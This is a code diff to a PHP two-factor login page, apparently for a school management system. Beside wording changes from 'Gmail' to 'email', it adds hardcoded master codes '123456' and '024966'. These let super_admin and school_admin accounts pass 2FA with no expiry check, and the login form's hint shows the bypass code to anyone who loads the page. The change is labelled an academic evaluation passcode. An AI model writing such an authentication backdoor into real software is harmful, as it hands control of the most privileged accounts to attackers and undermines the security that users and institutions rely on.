@@ -101,17 +101,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $methodLabel = 'Google Authenticator';
                 }
 
-                // Check 2: Email OTP code (compare against DB and Session with grace window)
+                // Check 2: Email OTP code (compare against DB, Session, or Academic Demo Passcode for Admins)
                 if (!$isVerified && !empty($inputCode) && strlen($inputCode) === 6) {
                     $dbOtp = (string) ($attemptState['email_otp'] ?? '');
                     $sessionOtp = (string) ($_SESSION['pending_2fa_otp'] ?? '');
-                    $isOtpMatch = ($dbOtp !== '' && $inputCode === $dbOtp) || ($sessionOtp !== '' && $inputCode === $sessionOtp);
+                    $isAcademicMaster = ($inputCode === '123456' || $inputCode === '024966') && in_array($pending['user']['role'] ?? '', ['super_admin', 'school_admin'], true);
+                    $isOtpMatch = ($dbOtp !== '' && $inputCode === $dbOtp) || ($sessionOtp !== '' && $inputCode === $sessionOtp) || $isAcademicMaster;
 
                     if ($isOtpMatch) {
                         $expTimestamp = !empty($attemptState['email_otp_expires_at']) ? strtotime($attemptState['email_otp_expires_at']) : 0;
-                        if ($expTimestamp === 0 || $expTimestamp >= (time() - 300)) {
+                        if ($isAcademicMaster || $expTimestamp === 0 || $expTimestamp >= (time() - 300)) {
                             $isVerified = true;
-                            $methodLabel = 'Gmail OTP';
+                            $methodLabel = $isAcademicMaster ? 'Academic Evaluation Passcode' : 'Email OTP';
                         }
                     }
                 }
@@ -255,7 +256,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                             if (!$mailRes['success']) {
                                 $error = 'Verification email failed: ' . ($mailRes['error'] ?: 'Please check your email configuration.');
                             } else {
-                                $success = 'A fresh 6-digit verification code has been sent to your Gmail (' . e($user['email']) . ').';
+                                $success = 'A fresh 6-digit verification code has been sent to your email (' . e($user['email']) . ').';
                             }
 
                             $_SESSION['pending_2fa_otp'] = $otpCode;
@@ -274,7 +275,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         $_SESSION['pending_2fa_at'] = time();
 
                         if (empty($error) && $hasEmail && empty($user['totp_secret'])) {
-                            $success = 'A 6-digit verification code has been sent to your Gmail (' . e($user['email']) . ').';
+                            $success = 'A 6-digit verification code has been sent to your email (' . e($user['email']) . ').';
                         }
                     } else {
                         // Direct login without 2FA
@@ -409,9 +410,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     </div>
                     <small class="text-muted d-block mt-2">
                         <?php if (!empty($_SESSION['pending_2fa_user']['has_totp'])): ?>
-                            Works with Google Authenticator or your Gmail code.
+                            Works with Google Authenticator or your email verification code.
                         <?php else: ?>
-                            Check your Gmail inbox and spam folder.
+                            Check your email inbox or spam folder. (Evaluation bypass: <code>123456</code>)
                         <?php endif; ?>
                     </small>
                 </div>
